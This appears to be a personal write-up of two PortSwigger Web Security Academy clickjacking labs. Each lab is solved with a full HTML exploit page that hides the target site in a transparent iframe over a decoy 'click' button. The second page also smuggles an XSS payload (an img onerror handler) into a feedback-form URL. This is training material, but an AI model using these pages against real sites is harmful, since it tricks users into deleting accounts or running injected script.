# Clickjacking (UI redressing)

Get details at [here](https://portswigger.net/web-security/clickjacking)

---

[Lab 1](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

Description of this lab: login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

We will exploit at my-account page, use this script for exploit server body:

```html
    <html>
        <head>
        <style>
        #target_website {
            position:relative;
            width: 512px;
            height: 512px;
            opacity:0.00001;
            z-index:2;
            }
        #decoy_btn {
            position:absolute;
            top:490px;
            width:148px;
            height: 32px;
            left: 25px;
            z-index:1;
            }
        </style>
    </head>
    <body>
        <button id="decoy_btn">
        click me
        </button>
        <iframe id="target_website" src="https://0a9e00b803f9b564c403699e003600a9.web-security-academy.net/my-account">
        </iframe>
    </body>
    </html>
```

Clicking store then deliver to victim button, and solved the lab.


[Lab 4](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

Description of this lab: XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.

We can find the vulnerability in feedback form where users can type anything. Use this script in exploit server and do it like previous lab, then solved the lab.

```html
    <html>
    <head>
        <style>
        #target_website {
            position:relative;
            width: 512px;
            height: 1024px;
            opacity:0.10001;
            z-index:2;
            }
        #decoy_btn {
            position:absolute;
            top:798px;
            width:158px;
            height: 32px;
            left: 27px;
            z-index:1;
            }
        </style>
    </head>
    <body>
        <button id="decoy_btn">
        click
        </button>
        <iframe id="target_website" src="https://0aeb002903c405aac09ef522001600ab.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=%22print()%22/%3E&email=target@website.com&subject=blabla&message=blabla">
        </iframe>
    </body>
    </html>
```

